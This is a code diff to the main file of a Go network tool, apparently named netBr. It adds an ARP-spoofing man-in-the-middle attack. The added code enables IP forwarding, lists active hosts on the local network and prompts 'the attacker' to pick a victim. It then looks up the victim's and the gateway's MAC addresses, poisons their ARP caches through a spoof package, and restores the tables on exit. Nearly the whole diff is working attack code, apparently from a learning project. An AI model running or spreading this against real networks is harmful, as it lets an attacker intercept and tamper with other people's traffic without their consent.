@@ -3,9 +3,14 @@ package main
 import (
 	"fmt"
 	"log"
+	"net"
+	"os"
+	"os/signal"
+	"syscall"
 
 	"github.com/KennyZ69/netBr/pkg"
 	ipkg "github.com/KennyZ69/netBr/pkg/ip"
+	"github.com/KennyZ69/netBr/spoof"
 )
 
 func main() {
@@ -41,7 +46,7 @@ func main() {
 			LocalIP: ip,
 			Mac:     ownMac,
 			CIDR:    cidr,
-			Gateway: gateway,
+			Gateway: gateway.String(),
 		}
 		if err = pkg.SaveConf(cfg); err != nil {
 			log.Fatalf("Error saving config file: %s\n", err)
@@ -52,7 +57,15 @@ func main() {
 	fmt.Printf("Gotten ip: %s\n", cfg.LocalIP)
 	fmt.Printf("Gotten mac: %s\n", cfg.Mac)
 	fmt.Printf("Gotten CIDR: %s\n", cfg.CIDR)
-	fmt.Printf("Gotten Gateway IP: %s\n", cfg.Gateway.String())
+	if cfg.Gateway == "" { // or "<nil>"
+		gateway, _ := ipkg.GetGateway()
+		cfg.Gateway = gateway.String()
+	}
+	fmt.Printf("Gotten Gateway IP: %s\n", cfg.Gateway)
+
+	if err := enableIpForwarding(); err != nil {
+		log.Fatalf("Error enabling packet forwarding: %s\n", err)
+	}
 
 	activeIPs, err := ipkg.HighListIPs(cfg.CIDR, cfg.NetIfi, cfg.LocalIP)
 	if err != nil {
@@ -65,4 +78,50 @@ func main() {
 
 	// TODO:
 	// Now I could print out the active IP addresses and let the attacker choose which one to intercept
+
+	targetIP := chooseVictimIP(activeIPs)
+	// fmt.Printf("Target: %s\n", target.String())
+
+	gatewayMAC, err := pkg.GetMacFromIP(net.ParseIP(cfg.Gateway), cfg.NetIfi)
+	if err != nil {
+		log.Fatalf("Error getting gateway MAC addr: %s\n", err)
+	}
+	targetMAC, err := pkg.GetMacFromIP(targetIP, cfg.NetIfi)
+	if err != nil {
+		log.Fatalf("Error getting target MAC addr: %s\n", err)
+	}
+
+	handleExit(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), targetMAC, gatewayMAC)
+
+	spoof.SpoofARP(cfg.NetIfi, targetIP, net.ParseIP(cfg.Gateway), net.HardwareAddr(cfg.Mac), targetMAC, gatewayMAC)
+}
+
+func chooseVictimIP(activeIPs []net.IP) net.IP {
+	var idx int
+
+	for {
+		fmt.Println("Choose the number of the IP to attack")
+		fmt.Scanln(&idx)
+		if idx > len(activeIPs) || idx < 1 {
+			continue
+		}
+		return activeIPs[idx-1]
+	}
+
+}
+
+func enableIpForwarding() error {
+	return os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte("1"), 0644)
+}
+
+// handleExit captures termination (exit) signals to then restore arp tables to their original (healthy) state
+func handleExit(ifi *net.Interface, victimIP, gatewayIP net.IP, victimMAC, gatewayMAC net.HardwareAddr) {
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, os.Interrupt, os.Kill, syscall.SIGTERM)
+
+	go func() {
+		<-sigChan // when one of those signals gets to the channel
+		spoof.RestoreArpTables(ifi, victimIP, gatewayIP, victimMAC, gatewayMAC)
+		os.Exit(0)
+	}()
 }
